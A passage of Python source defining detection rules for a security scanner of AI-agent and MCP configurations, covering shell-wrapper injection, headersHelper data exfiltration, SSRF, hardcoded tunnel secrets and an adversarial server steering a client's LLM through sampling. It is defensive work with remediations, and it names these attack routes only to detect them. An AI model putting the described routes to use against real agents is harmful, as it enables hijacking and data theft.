from __future__ import annotations

from dataclasses import dataclass, field

from agent_audit_kit.models import Category, Severity


@dataclass
class RuleDefinition:
    rule_id: str
    title: str
    description: str
    severity: Severity
    category: Category
    remediation: str
    sarif_name: str = ""
    cve_references: list[str] = field(default_factory=list)
    owasp_mcp_references: list[str] = field(default_factory=list)
    owasp_agentic_references: list[str] = field(default_factory=list)
    adversa_references: list[str] = field(default_factory=list)
    auto_fixable: bool = False
    # v0.3.2 — SCHEMA_VERSION 2
    incident_references: list[str] = field(default_factory=list)
    aicm_references: list[str] = field(default_factory=list)


RULES: dict[str, RuleDefinition] = {}


# ---------------------------------------------------------------------------
# AICM tag overlay
#
# The CSA AI Controls Matrix (AICM, v1.0 July 2025) defines 243 controls
# across 18 domains. We tag the most obvious ten AAK rules so the
# `--compliance aicm` report + CSV surface has something to group on out
# of the box. Every entry here is applied after each rule is registered
# via `_r(...)` — see `_apply_aicm_overlay()` at the bottom of this file.
#
# TODO(csa-mcp-baseline): CSA's "MCP Security Baseline v0.1" RC is "coming
# soon" per their MCP Security Resource Center announcement
# (https://cloudsecurityalliance.org/blog/2025/08/20/securing-the-agentic-ai-control-plane-announcing-the-mcp-security-resource-center).
# When the RC1 URL drops, add a `csa_mcp_baseline_references` field to
# RuleDefinition and tag the AAK-MCP-* / AAK-A2A-* / AAK-STDIO-* rules.
# scripts/watch_csa_mcp_baseline.py polls for the drop and opens a
# tracking issue automatically.
# ---------------------------------------------------------------------------

_AICM_TAGS: dict[str, list[str]] = {
    # ---- Secrets Management (DSP-17) -----------------------------------
    "AAK-SECRET-001": ["DSP-17"],
    "AAK-SECRET-002": ["DSP-17"],
    "AAK-SECRET-003": ["DSP-17"],
    "AAK-SECRET-004": ["DSP-17"],
    "AAK-SECRET-005": ["DSP-17"],
    "AAK-SECRET-006": ["DSP-17"],
    "AAK-SECRET-007": ["DSP-17"],
    "AAK-SECRET-008": ["DSP-17"],
    "AAK-SECRET-009": ["DSP-17"],
    # ---- Identity & Access Management ----------------------------------
    "AAK-TRUST-001": ["IAM-16"],
    "AAK-TRUST-002": ["IAM-16"],
    "AAK-TRUST-003": ["IAM-02"],
    "AAK-TRUST-004": ["IAM-02"],
    "AAK-TRUST-005": ["IAM-16"],
    "AAK-TRUST-006": ["IAM-16"],
    "AAK-TRUST-007": ["IAM-02"],
    "AAK-OAUTH-001": ["IAM-01", "IAM-16"],
    "AAK-OAUTH-002": ["IAM-01"],
    "AAK-OAUTH-003": ["IAM-01"],
    "AAK-OAUTH-004": ["IAM-01"],
    "AAK-OAUTH-005": ["IAM-01"],
    "AAK-OAUTH-SCOPE-001": ["IAM-16"],
    "AAK-OAUTH-3P-001": ["STA-08"],
    # ---- Supply Chain Management ---------------------------------------
    "AAK-SUPPLY-001": ["STA-02"],
    "AAK-SUPPLY-002": ["STA-08"],
    "AAK-SUPPLY-003": ["STA-02"],
    "AAK-SUPPLY-004": ["STA-02"],
    "AAK-SUPPLY-005": ["STA-08"],
    "AAK-SUPPLY-006": ["STA-08"],
    "AAK-DNS-REBIND-001": ["IVS-04", "CEK-08"],
    "AAK-DNS-REBIND-002": ["STA-02", "STA-08"],
    "AAK-SPLUNK-TOKLOG-001": ["DSP-17", "LOG-06"],
    "AAK-GHA-IMMUTABLE-001": ["STA-02", "CCC-08"],
    "AAK-EXCEL-MCP-001": ["AIS-07", "IVS-04"],
    "AAK-ASTROMCP-SQLI-CVE-2026-7591-001": ["AIS-07", "DSP-04", "IVS-09"],
    "AAK-LITELLM-CVE-2026-30623-PIN-001": ["STA-08", "AIS-08"],
    "AAK-CHATGPT-MCP-CVE-2026-7061-PIN-001": ["AIS-08", "IAM-05", "STA-08"],
    "AAK-DOCSGPT-MCP-STDIO-MITM-001": ["AIS-08", "IAM-05", "STA-08", "IVS-04"],
    "AAK-GPTRESEARCHER-MCP-STDIO-MITM-001": ["AIS-08", "IAM-05", "STA-08", "IVS-04"],
    "AAK-CLAUDECODE-CVE-2026-40068-PIN-001": ["IAM-02", "IAM-16", "STA-08"],
    "AAK-SK-INMEMORY-VECTORSTORE-FILTER-CVE-2026-26030-PIN-001": ["AIS-08", "STA-08", "IVS-04"],
    "AAK-MCPCALC-CVE-2026-44717-PIN-001": ["AIS-08", "STA-08", "IVS-04"],
    "AAK-MCP-TOOL-UNSAFE-EVAL-001": ["AIS-08", "IVS-04"],
    "AAK-METIS-REFUSAL-REFEED-001": ["AIS-07", "AIS-12"],
    "AAK-MCP-LINEAGE-STAINLESS-001": ["STA-02", "STA-08"],
    "AAK-SKILL-LIFECYCLE-ATTRIBUTION-001": ["LOG-06", "AIS-12"],
    "AAK-AGENT-HARNESS-SHARED-STATE-001": ["AIS-04", "IAM-05"],
    "AAK-METIS-SCORING-SINK-001": ["AIS-07", "AIS-12"],
    "AAK-MCP-OPENAPI-LAZY-DESCRIPTION-001": ["AIS-07"],
    "AAK-MCP-OPENAPI-BLOATED-PARAMS-001": ["AIS-07"],
    "AAK-MCP-OPENAPI-TANGLED-METHODS-001": ["AIS-07"],
    "AAK-NEXT-AI-DRAW-001": ["LOG-13"],
    "AAK-LANGCHAIN-SSRF-REDIR-001": ["IVS-04", "AIS-08"],
    "AAK-SSRF-TOCTOU-001": ["IVS-04", "AIS-08"],
    "AAK-AZURE-MCP-001": ["IAM-01", "IAM-16"],
    "AAK-TOXICFLOW-001": ["AIS-12", "CCC-08"],
    "AAK-MCP-STDIO-CMD-INJ-001": ["AIS-08", "IAM-05"],
    "AAK-MCP-STDIO-CMD-INJ-002": ["AIS-08", "IAM-05"],
    "AAK-MCP-STDIO-CMD-INJ-003": ["AIS-08", "IAM-05"],
    "AAK-MCP-STDIO-CMD-INJ-004": ["AIS-08", "IAM-05"],
    "AAK-MCP-MARKETPLACE-CONFIG-FETCH-001": ["AIS-08", "STA-02"],
    "AAK-PRTITLE-IPI-001": ["AIS-07", "AIS-12"],
    "AAK-MCP-FHI-001": ["AIS-12", "CCC-08"],
    "AAK-MCP-ATLASSIAN-CVE-2026-27825-001": ["AIS-07", "STA-02"],
    "AAK-MCP-ATLASSIAN-CVE-2026-27826-001": ["AIS-07", "STA-02"],
    "AAK-IPI-WILD-CORPUS-001": ["AIS-07", "DSP-17"],
    "AAK-MCP-INSPECTOR-CVE-2026-23744-001": ["STA-02", "STA-08"],
    "AAK-MCP-SAMPLING-001": ["IAM-01", "AIS-07"],
    # ---- v0.3.25 (2026-05-25): 2026-07-28 stateless-MCP migration -----
    "AAK-MCP-STATELESS-001": ["IAM-01", "AIS-08"],
    "AAK-MCP-STATELESS-002": ["AIS-07", "AIS-08"],
    "AAK-MCP-STATELESS-003": ["IVS-04", "BCR-04"],
    "AAK-MCP-STATELESS-004": ["AIS-07"],
    "AAK-MCP-DEPRECATED-001": ["AIS-08"],
    "AAK-MCP-DEPRECATED-002": ["AIS-07", "AIS-08"],
    "AAK-MCP-DEPRECATED-003": ["AIS-08", "LOG-06"],
    "AAK-OAUTH-006": ["IAM-01", "IAM-16"],
    "AAK-OAUTH-007": ["IAM-01", "IAM-16"],
    "AAK-OAUTH-008": ["IAM-01", "IAM-16"],
    "AAK-AZURE-MCP-NOAUTH-001": ["IAM-01", "IAM-16"],
    "AAK-MCP-AUTH-PATHTRAVERSAL-001": ["IAM-01", "IVS-04"],
    "AAK-MCP-KONG-CVE-2026-13341-001": ["AIS-07", "AIS-12"],
    "AAK-MCP-GATEWAY-REGISTRY-CVE-2026-14471-001": ["AIS-07", "DSP-07"],
    "AAK-MCP-SSRF-001": ["IVS-04", "AIS-08"],
    "AAK-MCP-SERENA-CVE-2026-49471-001": ["IAM-01", "IAM-16"],
    "AAK-MCP-LITELLM-CVE-2026-59822-001": ["IAM-01", "STA-08"],
    "AAK-MCP-CLINE-CVE-2026-59723-001": ["IAM-01", "STA-08"],
    "AAK-MCP-TEXTEDITOR-CVE-2026-15138-001": ["AIS-07", "STA-08"],
    "AAK-MCP-N8N-CVE-2026-59207-001": ["IVS-04", "STA-08"],
    "AAK-MCP-RUFLO-CVE-2026-59726-001": ["IAM-01", "STA-08"],
    "AAK-MCP-DEEPSEEK-CVE-2026-55604-001": ["IAM-01", "STA-08"],
    "AAK-MCP-K8S-CVE-2026-61459-001": ["AIS-07", "IVS-09", "STA-08"],
    "AAK-MCP-ASTRBOT-CVE-2026-15501-001": ["IVS-04", "STA-08"],
    "AAK-MCP-HEALTHLAKE-CVE-2026-15643-001": ["IVS-04", "STA-08"],
    "AAK-MCP-PRAISONAI-CVE-2026-61427-001": ["IAM-01", "STA-08"],
    "AAK-MCP-APPIUM-CVE-2026-58500-001": ["AIS-07", "STA-08"],
    "AAK-MCP-PENPOT-CVE-2026-45805-001": ["IAM-01", "AIS-07", "STA-08"],
    "AAK-MCP-OPENCLAW-CVE-2026-62195-001": ["IAM-01", "STA-08"],
    "AAK-MCP-REPOMIX-CVE-2026-49988-001": ["DSP-17", "STA-08"],
    "AAK-MCP-BETTERAUTH-CVE-2026-53512-001": ["IAM-01", "IAM-16", "STA-08"],
    "AAK-MCP-SDK-CVE-2026-52869-001": ["IAM-01", "AIS-08"],
    "AAK-MCP-9ROUTER-CVE-2026-46339-001": ["IAM-01", "AIS-07", "STA-08"],
    "AAK-MCP-N8NMCP-CVE-2026-54052-001": ["IAM-01", "DSP-07", "STA-08"],
    "AAK-MCP-DBTMCP-CVE-2026-44968-001": ["AIS-07", "DSP-17", "STA-08"],
    "AAK-MCP-APIFY-CVE-2026-46341-001": ["IVS-04", "STA-08"],
    "AAK-MCP-AGENTICFLOW-CVE-2026-58195-001": ["AIS-07", "STA-08"],
    "AAK-MCP-HEALTHOMICS-CVE-2026-15415-001": ["IVS-04", "STA-08"],
    "AAK-LMDEPLOY-VL-SSRF-001": ["IVS-04", "AIS-08"],
    "AAK-SPLUNK-MCP-TOKEN-LEAK-001": ["DSP-17", "LOG-06"],
    "AAK-MARKETPLACE-001": ["STA-10"],
    "AAK-MARKETPLACE-002": ["STA-10"],
    "AAK-MARKETPLACE-003": ["STA-10"],
    "AAK-MARKETPLACE-004": ["STA-10"],
    "AAK-SKILL-001": ["STA-10"],
    "AAK-SKILL-002": ["STA-10"],
    "AAK-SKILL-003": ["STA-10"],
    "AAK-SKILL-004": ["STA-10"],
    "AAK-SKILL-005": ["STA-10"],
    # ---- Transport / Crypto --------------------------------------------
    "AAK-MCP-017": ["CEK-08"],
    "AAK-TRANSPORT-001": ["CEK-08"],
    "AAK-TRANSPORT-002": ["CEK-08"],
    "AAK-TRANSPORT-003": ["CEK-08"],
    "AAK-TRANSPORT-004": ["CEK-08"],
    # ---- Input validation / tool injection (AIS-07) --------------------
    "AAK-TAINT-001": ["AIS-07"],
    "AAK-TAINT-002": ["AIS-07"],
    "AAK-TAINT-003": ["AIS-07"],
    "AAK-TAINT-004": ["AIS-07"],
    "AAK-TAINT-005": ["AIS-07"],
    "AAK-TAINT-006": ["AIS-07"],
    "AAK-TAINT-007": ["AIS-07"],
    "AAK-TAINT-008": ["AIS-07"],
    "AAK-POISON-001": ["AIS-07"],
    "AAK-POISON-002": ["AIS-07"],
    "AAK-POISON-003": ["AIS-07"],
    "AAK-POISON-004": ["AIS-07"],
    "AAK-POISON-005": ["AIS-07"],
    "AAK-POISON-006": ["AIS-07"],
    "AAK-SSRF-001": ["IVS-04"],
    "AAK-SSRF-002": ["IVS-04"],
    "AAK-SSRF-003": ["IVS-04"],
    "AAK-SSRF-004": ["IVS-04"],
    "AAK-SSRF-005": ["IVS-04"],
    # ---- A2A protocol (IAM + STA) --------------------------------------
    "AAK-A2A-001": ["IAM-04"],
    "AAK-A2A-002": ["IAM-01"],
    "AAK-A2A-003": ["AIS-07"],
    "AAK-A2A-004": ["CEK-08"],
    "AAK-A2A-005": ["IAM-01"],
    "AAK-A2A-006": ["IAM-01"],
    "AAK-A2A-007": ["IAM-04"],
    "AAK-A2A-008": ["IAM-01"],
    "AAK-A2A-009": ["IAM-04"],
    "AAK-A2A-010": ["IAM-04"],
    "AAK-A2A-011": ["IAM-01"],
    "AAK-A2A-012": ["AIS-07"],
    # ---- Hook / Agent / Routine (IAM + change control) -----------------
    "AAK-HOOK-001": ["CCC-08"],
    "AAK-HOOK-002": ["CCC-08"],
    "AAK-HOOK-003": ["CCC-08"],
    "AAK-HOOK-004": ["IAM-01"],
    "AAK-HOOK-005": ["IAM-01"],
    "AAK-HOOK-006": ["CCC-08"],
    "AAK-HOOK-007": ["CCC-08"],
    "AAK-AGENT-001": ["IAM-02"],
    "AAK-AGENT-002": ["IAM-02"],
    "AAK-ROUTINE-001": ["IAM-02"],
    # ---- Logging (LOG) -------------------------------------------------
    "AAK-LOGINJ-001": ["LOG-06"],
    # ---- MCPwn / SDK hardening / CVE-response coverage -----------------
    "AAK-MCPWN-001": ["IAM-01"],
    "AAK-MCPFRAME-001": ["LOG-13"],
    "AAK-DORIS-001": ["AIS-07", "DSP-07"],
    "AAK-ANTHROPIC-SDK-001": ["AIS-07", "STA-08"],
    "AAK-FLOWISE-001": ["STA-08"],
    "AAK-STDIO-001": ["AIS-07"],
    "AAK-WINDSURF-001": ["AIS-07"],
    "AAK-NEO4J-001": ["IAM-02"],
    "AAK-CLAUDE-WIN-001": ["CCC-08"],
    "AAK-SEC-MD-001": ["STA-10"],
    # ---- v0.3.9 (2026-04-28) --------------------------------------------
    "AAK-PROJECT-DEAL-DRIFT-001": ["AIS-07", "DSP-07"],
    "AAK-LANGGRAPH-TOOLNODE-LIST-REGRESSION-001": ["AIS-07"],
    "AAK-DEEPSEEK-V4-MOE-TOOL-INJ-001": ["AIS-07"],
    "AAK-TIKTOK-AGENT-HIJACK-001": ["IAM-02", "CCC-08"],
    "AAK-OX-COVERAGE-MANIFEST-001": ["STA-08"],
    # ---- v0.3.10 (2026-04-29) -------------------------------------------
    "AAK-CREWAI-CHAIN-2026-04-001": ["AIS-07", "STA-08"],
    "AAK-CREWAI-CVE-2026-2275-001": ["AIS-07", "IVS-04"],
    "AAK-CREWAI-CVE-2026-2285-001": ["AIS-07"],
    "AAK-CREWAI-CVE-2026-2286-001": ["IVS-04"],
    "AAK-CREWAI-CVE-2026-2287-001": ["AIS-07", "IVS-04"],
    "AAK-LANGCHAIN-PROMPT-LOADER-PATH-001": ["AIS-07"],
    "AAK-PRISMA-AIRS-COVERAGE-001": ["STA-08"],
    "AAK-OPENCLAW-PRIVESC-001": ["IAM-02"],
}


def _r(
    rule_id: str,
    title: str,
    description: str,
    severity: Severity,
    category: Category,
    remediation: str,
    sarif_name: str = "",
    cve_references: list[str] | None = None,
    owasp_mcp_references: list[str] | None = None,
    owasp_agentic_references: list[str] | None = None,
    adversa_references: list[str] | None = None,
    auto_fixable: bool = False,
    incident_references: list[str] | None = None,
    aicm_references: list[str] | None = None,
) -> None:
    RULES[rule_id] = RuleDefinition(
        rule_id=rule_id,
        title=title,
        description=description,
        severity=severity,
        category=category,
        remediation=remediation,
        sarif_name=sarif_name,
        cve_references=cve_references or [],
        owasp_mcp_references=owasp_mcp_references or [],
        owasp_agentic_references=owasp_agentic_references or [],
        adversa_references=adversa_references or [],
        auto_fixable=auto_fixable,
        incident_references=incident_references or [],
        aicm_references=aicm_references or [],
    )


# ---------------------------------------------------------------------------
# MCP Configuration Security (10 rules)
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-001",
    "Remote MCP server without authentication",
    "An MCP server uses HTTP transport (url field) without any authentication headers. "
    "Unauthenticated remote servers can be MITM'd or spoofed.",
    Severity.CRITICAL,
    Category.MCP_CONFIG,
    "Add OAuth 2.1 bearer token or API key header authentication.",
    sarif_name="RemoteMcpServerNoAuth",
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-01"],
)

_r(
    "AAK-MCP-002",
    "MCP server command runs with shell expansion",
    "An MCP server command contains shell metacharacters or shell wrappers (sh -c, bash -c). "
    "This enables command injection via argument composition.",
    Severity.CRITICAL,
    Category.MCP_CONFIG,
    "Use direct executable paths without shell wrappers.",
    sarif_name="McpCommandShellInjection",
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-INJECT-01"],
)

_r(
    "AAK-MCP-003",
    "MCP server environment exposes secrets",
    "Hardcoded secrets found in mcpServers env block. "
    "Secrets in project-scoped MCP config are committed to git.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Use environment variable references or a secrets manager.",
    sarif_name="McpEnvExposesSecrets",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-TOKEN-01"],
)

_r(
    "AAK-MCP-004",
    "Excessive number of MCP servers declared",
    "More than 10 MCP servers in a single config. "
    "Large tool surface increases attack surface.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Audit and remove unnecessary servers. Pin to minimum required set.",
    sarif_name="ExcessiveMcpServers",
    cve_references=["CVE-2026-21852"],
    owasp_mcp_references=["MCP02:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-SCOPE-01"],
)

_r(
    "AAK-MCP-005",
    "MCP server uses npx/uvx to fetch and execute remote packages",
    "The command uses npx, uvx, bunx, or pnpx which fetches the latest version from "
    "a registry at runtime, vulnerable to typosquatting and dependency confusion.",
    Severity.MEDIUM,
    Category.MCP_CONFIG,
    "Pin exact package versions or use locally installed packages.",
    sarif_name="McpRuntimePackageFetch",
    owasp_mcp_references=["MCP03:2025", "MCP10:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-SUPPLY-01"],
)

_r(
    "AAK-MCP-006",
    "MCP server command uses relative path",
    "The command uses a relative path that can be hijacked via PATH manipulation.",
    Severity.MEDIUM,
    Category.MCP_CONFIG,
    "Use absolute paths for MCP server executables.",
    sarif_name="McpCommandRelativePath",
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-INJECT-02"],
)

_r(
    "AAK-MCP-007",
    "MCP server lacks version pinning in args",
    "Package name in args lacks @version suffix when using npx/uvx. "
    "Unpinned packages can silently update to malicious versions.",
    Severity.LOW,
    Category.MCP_CONFIG,
    "Pin with @x.y.z suffix, e.g., @modelcontextprotocol/server-filesystem@2025.1.1",
    sarif_name="McpUnpinnedPackageVersion",
    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-SUPPLY-02"],
)

_r(
    "AAK-MCP-008",
    "MCP server headersHelper executes arbitrary commands",
    "The headersHelper field executes arbitrary shell commands to generate headers. "
    "A malicious repo can exfiltrate data via header generation.",
    Severity.CRITICAL,
    Category.MCP_CONFIG,
    "Avoid headersHelper in project-scoped configs. Use static headers or OAuth flows instead.",
    sarif_name="McpHeadersHelperShellExec",
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-INJECT-03"],
)

_r(
    "AAK-MCP-009",
    "MCP server URL points to localhost/internal network",
    "The MCP server URL points to localhost or internal network addresses, "
    "which may expose internal services (SSRF pattern).",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Ensure local MCP servers are intentional and document the trust assumption.",
    sarif_name="McpLocalhostInternalUrl",
    owasp_mcp_references=["MCP09:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-SSRF-01"],
)

_r(
    "AAK-MCP-010",
    "MCP server config allows arbitrary filesystem root access",
    "An MCP server is configured with filesystem root (/) or home directory access, "
    "allowing unrestricted file operations.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Restrict filesystem access to specific project directories only.",
    sarif_name="McpFilesystemRootAccess",
    owasp_mcp_references=["MCP06:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-SCOPE-02"],
)

_r(
    "AAK-MCP-ATTEST-001",
    "MCP server admitted without attestation",
    "An MCP server entry in the agent/host config is dispatched without any of: a referenced "
    "signed clearance assertion, a `/.well-known/mcp-clearance` (or configured) URI, or a "
    "pinned trust root. Deny-by-default server admission is unenforced, so the server's "
    "self-declared tool list is implicitly trusted at dispatch time.",
    Severity.MEDIUM,
    Category.MCP_CONFIG,
    "Add an `attestation` (or `clearance`) field on the server entry pointing to a signed "
    "clearance document, expose it at `/.well-known/mcp-clearance`, and pin a `trust_root` "
    "in the host config that the host verifies before any tool dispatch. See Metere 2026, "
    "arXiv:2605.24248 — wire format, verification algorithm, and RFC-2119 conformance vectors.",
    sarif_name="McpServerUnattested",
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03", "ASI04"],
    incident_references=["arXiv:2605.24248"],
)

# ---------------------------------------------------------------------------
# Anthropic MCP Tunnels (research preview, launched 2026-05-19)
# Docs: https://platform.claude.com/docs/en/agents-and-tools/mcp-tunnels/{overview,reference,security}
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-TUNNEL-001",
    "MCP Tunnels proxy: SSRF defense disabled or bypassed",
    "An MCP Tunnels gateway-proxy config (`/etc/mcp-gateway/config.yaml` or "
    "the Helm `gateway.config.*` ConfigMap) either sets "
    "`upstream.disable_ip_validation: true` or names an `upstream.allowed_ips` "
    "CIDR that covers the public internet (0.0.0.0/0, ::/0, or a /0–/7 IPv4 "
    "prefix). The reference page calls `upstream.allowed_ips` the proxy's "
    "primary SSRF defense; disabling it lets a malicious upstream-side process "
    "reach arbitrary hosts the proxy can route to.",
    Severity.CRITICAL,
    Category.MCP_CONFIG,
    "Set `upstream.allowed_ips` to the smallest CIDR ranges that cover your "
    "MCP servers (the reference's default is the RFC1918 private space). "
    "Remove `disable_ip_validation: true`. See "
    "https://platform.claude.com/docs/en/agents-and-tools/mcp-tunnels/security "
    "(`Restrict upstream.allowed_ips`).",
    sarif_name="McpTunnelSsrfDefenseDisabled",
    owasp_mcp_references=["MCP04:2025", "MCP06:2025"],
    owasp_agentic_references=["ASI02", "ASI05"],
    incident_references=[
        "Anthropic MCP Tunnels 2026-05-19",
        "platform.claude.com/docs/en/agents-and-tools/mcp-tunnels/reference",
    ],
)

_r(
    "AAK-MCP-TUNNEL-002",
    "MCP Tunnels proxy: HTTPS upstream without trust anchor",
    "An MCP Tunnels gateway-proxy config declares one or more `https://` "
    "upstreams under `routes:` but sets neither `upstream.tls.ca_file` nor "
    "`upstream.tls.include_system_cas: true`. Quoting the reference: "
    "\"otherwise the proxy has no trust anchor for the upstream certificate.\" "
    "Without a trust anchor the proxy will fail closed at best or accept a "
    "man-in-the-middle's certificate at worst, depending on the proxy build.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Add `upstream.tls.ca_file: <path>` pointing at a CA bundle that issued "
    "the upstream certificates, OR set "
    "`upstream.tls.include_system_cas: true` to trust the system CA bundle. "
    "See https://platform.claude.com/docs/en/agents-and-tools/mcp-tunnels/reference#proxy-configuration.",
    sarif_name="McpTunnelUpstreamNoTrustAnchor",
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03"],
    incident_references=[
        "Anthropic MCP Tunnels 2026-05-19",
        "platform.claude.com/docs/en/agents-and-tools/mcp-tunnels/reference",
    ],
)

_r(
    "AAK-MCP-TUNNEL-003",
    "MCP Tunnels: tunnel credentials hardcoded in repo / CI",
    "A tunnel token or server TLS private key is checked into the repository "
    "or pinned as a literal value in a CI workflow. Per the MCP Tunnels "
    "overview, \"if an attacker obtains your tunnel token AND one of your "
    "TLS private keys, they could impersonate your proxy and read MCP "
    "request payloads — treat both as high-value secrets.\" Triggers on "
    "literal tunnel-token env vars in CI, PEM private keys committed under "
    "MCP-Tunnels paths, and Kubernetes Secret manifests named "
    "`mcp-tunnel` / `mcp-tunnel-token` / `mcp-tunnel-cert` carrying inline "
    "`data:` values.",
    Severity.CRITICAL,
    Category.MCP_CONFIG,
    "Move tunnel tokens and server-cert material into a secrets manager "
    "(GitHub Actions secrets, Vault, sealed-secrets, External Secrets "
    "Operator, vault-secrets-operator). For the setup CLI, use Workload "
    "Identity Federation (`ANTHROPIC_IDENTITY_TOKEN_FILE`) instead of a "
    "literal token. See "
    "https://platform.claude.com/docs/en/agents-and-tools/mcp-tunnels/security "
    "(`Protect credentials at rest`, `Rotate credentials`).",
    sarif_name="McpTunnelCredentialHardcoded",
    owasp_mcp_references=["MCP02:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI03", "ASI06"],
    incident_references=[
        "Anthropic MCP Tunnels 2026-05-19",
        "platform.claude.com/docs/en/agents-and-tools/mcp-tunnels/overview",
        "platform.claude.com/docs/en/agents-and-tools/mcp-tunnels/security",
    ],
)

_r(
    "AAK-MCP-SAMPLING-001",
    "MCP `sampling` capability declared without consent / elicitation guard",
    "An MCP server or client participates in the `sampling` capability (the "
    "server can request LLM completions through the client) without an "
    "accompanying elicitation/consent gate, human-approval flag, or "
    "documented risk acceptance. Sampling output must be treated as untrusted "
    "tool input — without a guard, a compromised or adversarial server can "
    "silently steer the client's LLM (and any tool calls it triggers).",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Require an elicitation/createMessage consent prompt before honoring "
    "sampling requests, and treat sampling output as untrusted tool input "
    "(re-run the same sanitization you apply to user input). If sampling is "
    "intentional, accept the risk in `.agent-audit-kit.yml` with "
    "`accepts_sampling_risk: true` and a non-empty `justification:`.",
    sarif_name="McpSamplingNoConsent",
    owasp_mcp_references=["MCP07:2025", "MCP02:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-02"],
)

# ---------------------------------------------------------------------------
# AAK-MCP-STATELESS-001..004 — 2026-07-28 stateless-MCP migration
#
# The MCP 2026-07-28 spec release candidate makes the protocol stateless by
# default: the `Mcp-Session-Id` header and the protocol-level session are
# removed and replaced with explicit, server-minted state handles (SEP-2567),
# while making the mandatory initialization handshake optional so stateless is
# the default (SEP-1442 / SEP-2575). The experimental Tasks primitive (SEP-1686)
# — including `tasks/list` — is moved out of the core spec into the Extensions
# framework (redesigned as SEP-2663), so core `tasks/list` is removed. Server/
# client code that assumes the pre-RC stateful protocol — relies on
# `Mcp-Session-Id`, dispatches `tasks/list`, requires sticky routing or a shared
# session store, or skips client-side caching of `tools/list` while holding
# per-session server state — will silently break after 2026-07-28 once the final
# spec lands. These four rules surface the migration surface so it can be fixed
# before the cutover.
#
# Sources:
#   https://blog.modelcontextprotocol.io/posts/2026-07-28-release-candidate/
#   https://modelcontextprotocol.io/seps/2567-sessionless-mcp
#   https://github.com/modelcontextprotocol/modelcontextprotocol/issues/1442
#   https://github.com/modelcontextprotocol/modelcontextprotocol/pull/2575
#   https://modelcontextprotocol.io/community/seps/1686-tasks
#   https://github.com/modelcontextprotocol/modelcontextprotocol/pull/2663
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-STATELESS-001",
    "Reliance on `Mcp-Session-Id` header / protocol-level session id",
    "Server or client code reads, writes, asserts, or constants the "
    "`Mcp-Session-Id` header. The MCP 2026-07-28 spec release candidate "
    "removes the `Mcp-Session-Id` header and the protocol-level session, "
    "replacing them with explicit server-minted state handles (SEP-2567); "
    "SEP-1442 / SEP-2575 make the initialization handshake optional so "
    "stateless is the default. After "
    "the final spec lands on 2026-07-28, code that depends on this header "
    "(or on the session it represented) will silently break: any MCP "
    "request can land on any server instance, and sticky routing / shared "
    "session stores at the protocol layer are no longer guaranteed.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Migrate to the 2026-07-28 stateless transport: route on the "
    "`Mcp-Method` header instead of `Mcp-Session-Id`, drop the "
    "per-connection session id, and treat each request as independently "
    "addressable. If per-server state is genuinely required, persist it "
    "behind an out-of-band identity (auth subject, OAuth `sub`, tool "
    "argument) rather than the removed session header.",
    sarif_name="McpSessionIdReliance",
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03"],
)

_r(
    "AAK-MCP-STATELESS-002",
    "Use of removed `tasks/list` method",
    "Server or client code dispatches, handles, or names the `tasks/list` "
    "JSON-RPC method. The MCP 2026-07-28 spec release candidate removes "
    "`tasks/list` from the core because it cannot be scoped safely without "
    "the protocol-level session: the experimental Tasks primitive (SEP-1686) "
    "moves out of the core specification into the Extensions framework "
    "(redesigned as SEP-2663), and the stateful list surface has no "
    "stateless successor in core.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Stop calling and handling `tasks/list`. If your application needs an "
    "enumeration of in-flight work, model it as an extension primitive "
    "scoped to an authenticated identity, or store task identifiers "
    "client-side and re-query them with `tasks/get` style point lookups.",
    sarif_name="McpTasksListRemoved",
    owasp_mcp_references=["MCP07:2025"],
)

_r(
    "AAK-MCP-STATELESS-003",
    "Sticky-session / shared-store dependency in MCP deployment",
    "An MCP server's deployment manifest requires sticky routing (nginx "
    "`ip_hash`, Kubernetes `sessionAffinity: ClientIP`, Traefik / ALB "
    "sticky cookies) or its handler code reads a shared session store "
    "keyed by a per-connection id used across requests. The 2026-07-28 "
    "stateless transport guarantees that any MCP request can land on any "
    "server instance — sticky routing and gateway deep-packet-inspection "
    "to keep a client pinned to one pod stop being safe assumptions.",
    Severity.MEDIUM,
    Category.MCP_CONFIG,
    "Remove sticky-session affinity from the gateway and Kubernetes "
    "service. Move per-request state into an external store keyed on an "
    "out-of-band identity (auth subject) rather than a per-connection "
    "session id. Re-test horizontal scaling without affinity before the "
    "2026-07-28 cutover.",
    sarif_name="McpStickySessionDependency",
    owasp_mcp_references=["MCP07:2025"],
)

_r(
    "AAK-MCP-STATELESS-004",
    "MCP client never caches `tools/list` and depends on per-session state",
    "Client code calls `tools/list` (or the SDK alias `list_tools`) inside "
    "a hot path / per-request loop with no caching marker (no `lru_cache`, "
    "TTL cache, dict memoization, or `cached_*` helper) nearby. Combined "
    "with reliance on per-session server state, this pattern multiplies "
    "round-trips and breaks when the 2026-07-28 stateless transport lets "
    "successive requests hit different server instances with different "
